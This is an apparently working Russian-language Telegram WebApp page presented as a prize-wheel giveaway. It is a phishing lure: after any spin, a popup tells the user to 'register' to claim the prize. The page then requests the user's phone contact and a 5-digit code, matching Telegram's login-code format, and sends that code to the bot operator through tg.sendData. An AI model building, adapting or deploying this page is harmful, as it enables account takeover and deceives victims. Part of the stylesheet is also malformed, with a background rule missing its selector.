<!DOCTYPE html>
<html lang="ru">

<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body { overflow-x: hidden; min-height: 100%; }

      radial-gradient(ellipse at 10% 70%, rgba(10, 40, 130, 0.2) 0%, transparent 45%),
      url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500"><g fill="%23fff"><circle cx="10" cy="25" r="0.8" opacity="0.9"/><circle cx="55" cy="8" r="0.6" opacity="0.7"/><circle cx="90" cy="42" r="1" opacity="0.8"/><circle cx="140" cy="15" r="0.7" opacity="0.9"/><circle cx="185" cy="55" r="1.2" opacity="0.6"/><circle cx="230" cy="20" r="0.8" opacity="0.8"/><circle cx="275" cy="48" r="0.6" opacity="0.9"/><circle cx="320" cy="10" r="1" opacity="0.7"/><circle cx="370" cy="38" r="0.8" opacity="0.8"/><circle cx="420" cy="18" r="0.6" opacity="0.9"/><circle cx="470" cy="50" r="1" opacity="0.7"/><circle cx="30" cy="80" r="1.2" opacity="0.6"/><circle cx="75" cy="95" r="0.8" opacity="0.8"/><circle cx="120" cy="75" r="0.6" opacity="0.9"/><circle cx="165" cy="100" r="1" opacity="0.7"/><circle cx="210" cy="82" r="0.8" opacity="0.8"/><circle cx="255" cy="110" r="0.6" opacity="0.9"/><circle cx="300" cy="88" r="1.2" opacity="0.6"/><circle cx="345" cy="72" r="0.8" opacity="0.8"/><circle cx="395" cy="105" r="0.6" opacity="0.7"/><circle cx="445" cy="85" r="1" opacity="0.9"/><circle cx="490" cy="95" r="0.8" opacity="0.8"/><circle cx="20" cy="140" r="0.6" opacity="0.9"/><circle cx="65" cy="155" r="1" opacity="0.7"/><circle cx="110" cy="130" r="0.8" opacity="0.8"/><circle cx="155" cy="165" r="0.6" opacity="0.9"/><circle cx="200" cy="145" r="1.2" opacity="0.6"/><circle cx="245" cy="170" r="0.8" opacity="0.8"/><circle cx="290" cy="135" r="0.6" opacity="0.7"/><circle cx="335" cy="160" r="1" opacity="0.9"/><circle cx="380" cy="142" r="0.8" opacity="0.8"/><circle cx="430" cy="168" r="1.2" opacity="0.6"/><circle cx="475" cy="148" r="0.6" opacity="0.9"/><circle cx="40" cy="200" r="1" opacity="0.7"/><circle cx="85" cy="215" r="0.8" opacity="0.8"/><circle cx="130" cy="195" r="0.6" opacity="0.9"/><circle cx="175" cy="225" r="1" opacity="0.7"/><circle cx="220" cy="205" r="0.8" opacity="0.8"/><circle cx="265" cy="230" r="1.2" opacity="0.6"/><circle cx="310" cy="210" r="0.6" opacity="0.9"/><circle cx="355" cy="220" r="1" opacity="0.7"/><circle cx="400" cy="200" r="0.8" opacity="0.8"/><circle cx="450" cy="218" r="0.6" opacity="0.9"/><circle cx="15" cy="260" r="0.8" opacity="0.8"/><circle cx="60" cy="275" r="1" opacity="0.7"/><circle cx="105" cy="255" r="0.6" opacity="0.9"/><circle cx="150" cy="280" r="0.8" opacity="0.8"/><circle cx="195" cy="265" r="1.2" opacity="0.6"/><circle cx="240" cy="285" r="0.6" opacity="0.9"/><circle cx="285" cy="270" r="1" opacity="0.7"/><circle cx="330" cy="258" r="0.8" opacity="0.8"/><circle cx="375" cy="278" r="0.6" opacity="0.9"/><circle cx="425" cy="262" r="1" opacity="0.7"/><circle cx="470" cy="275" r="0.8" opacity="0.8"/><circle cx="35" cy="320" r="1.2" opacity="0.6"/><circle cx="80" cy="310" r="0.8" opacity="0.8"/><circle cx="125" cy="335" r="0.6" opacity="0.9"/><circle cx="170" cy="315" r="1" opacity="0.7"/><circle cx="215" cy="340" r="0.8" opacity="0.8"/><circle cx="260" cy="325" r="1.2" opacity="0.6"/><circle cx="305" cy="318" r="0.6" opacity="0.9"/><circle cx="350" cy="332" r="1" opacity="0.7"/><circle cx="395" cy="312" r="0.8" opacity="0.8"/><circle cx="445" cy="328" r="0.6" opacity="0.9"/><circle cx="488" cy="315" r="1" opacity="0.7"/><circle cx="25" cy="375" r="0.8" opacity="0.8"/><circle cx="70" cy="390" r="1" opacity="0.7"/><circle cx="115" cy="368" r="0.6" opacity="0.9"/><circle cx="160" cy="385" r="0.8" opacity="0.8"/><circle cx="205" cy="372" r="1.2" opacity="0.6"/><circle cx="250" cy="395" r="0.6" opacity="0.9"/><circle cx="295" cy="378" r="1" opacity="0.7"/><circle cx="340" cy="368" r="0.8" opacity="0.8"/><circle cx="385" cy="388" r="0.6" opacity="0.9"/><circle cx="435" cy="375" r="1" opacity="0.7"/><circle cx="480" cy="392" r="0.8" opacity="0.8"/><circle cx="50" cy="440" r="1.2" opacity="0.6"/><circle cx="95" cy="455" r="0.8" opacity="0.8"/><circle cx="140" cy="435" r="0.6" opacity="0.9"/><circle cx="185" cy="460" r="1" opacity="0.7"/><circle cx="230" cy="445" r="0.8" opacity="0.8"/><circle cx="275" cy="465" r="1.2" opacity="0.6"/><circle cx="320" cy="450" r="0.6" opacity="0.9"/><circle cx="365" cy="438" r="1" opacity="0.7"/><circle cx="410" cy="458" r="0.8" opacity="0.8"/><circle cx="460" cy="442" r="0.6" opacity="0.9"/><circle cx="492" cy="455" r="1" opacity="0.7"/><circle cx="100" cy="488" r="0.8" opacity="0.8"/><circle cx="200" cy="492" r="1" opacity="0.7"/><circle cx="300" cy="485" r="0.6" opacity="0.9"/><circle cx="400" cy="490" r="0.8" opacity="0.8"/><circle cx="490" cy="482" r="1.2" opacity="0.6"/><circle cx="250" cy="250" r="1.5" opacity="0.4"/><circle cx="130" cy="300" r="2" opacity="0.3"/><circle cx="380" cy="150" r="1.8" opacity="0.35"/><circle cx="460" cy="380" r="1.5" opacity="0.4"/></g></svg>');
    background-repeat: repeat;
    background-size: 500px 500px;
  }

  /* --- вкладки --- */
  .tab-content { display: none; }
  .tab-content.active {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: calc(100vh - 150px);
  }

  /* --- колесо --- */
  .wheel-wrap {
    position: relative;
    width: min(300px, 80vw);
    height: min(300px, 80vw);
    margin: 0 auto 16px;
  }

  .wheel {
    width: 100%; height: 100%; border-radius: 50%;
    position: relative; overflow: hidden;
    border: 4px solid #3d9eff;
    box-shadow: 0 0 20px rgba(61,158,255,0.5), 0 0 50px rgba(61,158,255,0.15);
    transition: transform 4s cubic-bezier(0.17, 0.67, 0.16, 0.99);
    background: rgba(10, 20, 50, 0.8);
  }

  .wheel img {
    position: absolute; top: 50%; left: 50%;
    width: 56px; height: 56px; object-fit: cover; border-radius: 8px;
    border: 1px solid rgba(61,158,255,0.3);
  }

  .wheel-pointer {
    position: absolute; top: -16px; left: 50%; transform: translateX(-50%);
    width: 0; height: 0;
    border-left: 14px solid transparent;
    border-right: 14px solid transparent;
    border-top: 24px solid #3d9eff;
    filter: drop-shadow(0 0 6px rgba(61,158,255,0.9));
    z-index: 5;
  }

  #spin {
    margin-top: 20px;
    padding: 14px 36px; font-size: 18px; border: none; border-radius: 14px;
    background: linear-gradient(135deg, #1a5fcc, #3d9eff);
    color: #fff; letter-spacing: 0.3px;
    box-shadow: 0 0 18px rgba(61,158,255,0.5);
  }
  #spin:disabled { opacity: 0.4; box-shadow: none; }

  /* --- вход --- */
  .step { display: none; width: 100%; max-width: 320px; }
  .step.active {
    display: flex; flex-direction: column;
    align-items: center; gap: 18px;
  }

  .step h2 {
    font-size: 24px; font-weight: 700;
    color: #fff;
    text-shadow: 0 0 16px rgba(61,158,255,0.6);
  }

  .step p {
    font-size: 15px; color: #8aaad4;
    line-height: 1.6; max-width: 260px;
  }

  .code { display: flex; justify-content: center; gap: 10px; }
  .code input {
    width: 48px; height: 64px; font-size: 28px; text-align: center;
    background: rgba(61,158,255,0.07);
    color: #fff; border: 2px solid rgba(61,158,255,0.3); border-radius: 12px;
  }
  .code input:focus {
    border-color: #3d9eff; outline: none;
    box-shadow: 0 0 10px rgba(61,158,255,0.4);
  }

  button#send, button#askContact {
    padding: 14px 0; font-size: 17px; border: none; border-radius: 14px;
    background: linear-gradient(135deg, #1a5fcc, #3d9eff);
    color: #fff; width: 100%; max-width: 280px;
    box-shadow: 0 0 18px rgba(61,158,255,0.4);
  }
  button#send:disabled { opacity: 0.4; box-shadow: none; }

  /* --- таббар --- */
  .tabbar {
    position: fixed; bottom: 0; left: 0; right: 0; display: flex;
    border-top: 1px solid rgba(61,158,255,0.15);
    background: rgba(5, 8, 15, 0.95);
    backdrop-filter: blur(12px);
  }
  .tabbar button.tab-btn {
    flex: 1; padding: 14px 0; background: none; border: none;
    border-radius: 0; font-size: 15px; color: #445577;
    display: flex; flex-direction: column; align-items: center; gap: 2px;
  }
  .tabbar button.tab-btn.active { color: #3d9eff; font-weight: bold; }

  /* --- модалка --- */
  .overlay {
    position: fixed; inset: 0;
    background: rgba(5, 8, 15, 0.92);
    backdrop-filter: blur(10px);
    display: none; align-items: center; justify-content: center;
    flex-direction: column; z-index: 50; padding: 20px; gap: 18px;
  }
  .overlay.show { display: flex; }
  .overlay img {
    width: 160px; height: 160px; object-fit: cover; border-radius: 20px;
    border: 3px solid #3d9eff;
    box-shadow: 0 0 30px rgba(61,158,255,0.6), 0 0 60px rgba(61,158,255,0.2);
  }
  .overlay p {
    font-size: 16px; color: #8aaad4;
    max-width: 260px; line-height: 1.6;
  }
  .overlay button {
    padding: 14px 0; font-size: 16px; border: none; border-radius: 14px;
    background: linear-gradient(135deg, #1a5fcc, #3d9eff);
    color: #fff; width: 100%; max-width: 280px;
    box-shadow: 0 0 18px rgba(61,158,255,0.4);
  }
</style>
</head>
<body>

  <div id="tab1" class="tab-content active">
    <div class="wheel-wrap">
      <div class="wheel-pointer"></div>
      <div class="wheel" id="wheel">
        <img src="https://i.postimg.cc/fLVKzkwn/photo-5447343585033396378-x.jpg" alt="">
        <img src="https://i.postimg.cc/fLVKzkwn/photo-5447343585033396378-x.jpg" alt="">
        <img src="https://i.postimg.cc/fLVKzkwn/photo-5447343585033396378-x.jpg" alt="">
        <img src="https://i.postimg.cc/vDF6dZB8/photo-5447343585033396379-x.jpg" alt="">
        <img src="https://i.postimg.cc/fLVKzkwn/photo-5447343585033396378-x.jpg" alt="">
        <img src="https://i.postimg.cc/fLVKzkwn/photo-5447343585033396378-x.jpg" alt="">
        <img src="https://i.postimg.cc/fLVKzkwn/photo-5447343585033396378-x.jpg" alt="">
        <img src="https://i.postimg.cc/fLVKzkwn/photo-5447343585033396378-x.jpg" alt="">
        <img src="https://i.postimg.cc/vDF6dZB8/photo-5447343585033396379-x.jpg" alt="">
        <img src="https://i.postimg.cc/vDF6dZB8/photo-5447343585033396379-x.jpg" alt="">
      </div>
    </div>
    <button id="spin">Крутить 🎡</button>
  </div>

  <div id="tab2" class="tab-content">
    <div id="stepContact" class="step active">
      <h2>Вход</h2>
      <p>Чтобы продолжить, отправьте свой контакт</p>
      <button id="askContact">📱 Отправить контакт</button>
    </div>
    <div id="stepCode" class="step">
      <h2>Введите 5-значный код</h2>
      <div class="code">
        <input type="tel" maxlength="1" inputmode="numeric">
        <input type="tel" maxlength="1" inputmode="numeric">
        <input type="tel" maxlength="1" inputmode="numeric">
        <input type="tel" maxlength="1" inputmode="numeric">
        <input type="tel" maxlength="1" inputmode="numeric">
      </div>
      <button id="send" disabled>Подтвердить</button>
    </div>
  </div>

  <div class="tabbar">
    <button class="tab-btn active" data-tab="tab1">🎡</button>
    <button class="tab-btn" data-tab="tab2">Вход</button>
  </div>

  <div class="overlay" id="winOverlay">
    <img id="winImage" src="" alt="">
    <p>Чтобы забрать приз, пройдите регистрацию</p>
    <button id="goToReg">Перейти к регистрации</button>
  </div>

<script>
  const tg = window.Telegram.WebApp;
  tg.ready();
  tg.expand();

  const tabButtons = document.querySelectorAll(".tab-btn");
  const tabContents = document.querySelectorAll(".tab-content");

  function openTab(id) {
    tabButtons.forEach(b => b.classList.toggle("active", b.dataset.tab === id));
    tabContents.forEach(c => c.classList.toggle("active", c.id === id));
  }
  tabButtons.forEach(btn => btn.addEventListener("click", () => openTab(btn.dataset.tab)));

  const wheel = document.getElementById("wheel");
  const images = wheel.querySelectorAll("img");
  const radius = 95;
  const count = images.length;
  const step = 360 / count;

  images.forEach((img, i) => {
    const angle = step * i;
    img.style.transform = `translate(-50%, -50%) rotate(${angle}deg) translate(0, -${radius}px) rotate(-${angle}deg)`;
  });

  const spinBtn = document.getElementById("spin");
  const overlay = document.getElementById("winOverlay");
  const winImage = document.getElementById("winImage");
  const goToReg = document.getElementById("goToReg");
  let currentRotation = 0;

  spinBtn.addEventListener("click", () => {
    spinBtn.disabled = true;
    const extraSpins = 5;
    const randomStop = Math.floor(Math.random() * 360);
    currentRotation += extraSpins * 360 + randomStop;
    wheel.style.transform = `rotate(${currentRotation}deg)`;
    setTimeout(() => {
      spinBtn.disabled = false;
      const normalized = ((currentRotation % 360) + 360) % 360;
      let idx = Math.round((360 - normalized) / step) % count;
      if (idx < 0) idx += count;
      winImage.src = images[idx].src;
      overlay.classList.add("show");
    }, 4200);
  });

  goToReg.addEventListener("click", () => {
    overlay.classList.remove("show");
    openTab("tab2");
  });

  const stepContact = document.getElementById("stepContact");
  const stepCode = document.getElementById("stepCode");
  const askContactBtn = document.getElementById("askContact");

  askContactBtn.addEventListener("click", () => {
    tg.requestContact((granted) => {
      if (granted) {
        stepContact.classList.remove("active");
        stepCode.classList.add("active");
      }
    });
  });

  const inputs = document.querySelectorAll(".code input");
  const sendBtn = document.getElementById("send");

  function getCode() { return [...inputs].map(i => i.value).join(""); }

  inputs.forEach((input, i) => {
    input.addEventListener("input", () => {
      input.value = input.value.replace(/\D/g, "");
      if (input.value && i < inputs.length - 1) inputs[i + 1].focus();
      sendBtn.disabled = getCode().length !== 5;
    });
    input.addEventListener("keydown", e => {
      if (e.key === "Backspace" && !input.value && i > 0) inputs[i - 1].focus();
    });
  });

  sendBtn.addEventListener("click", () => tg.sendData(getCode()));
</script>
</body>
</html>
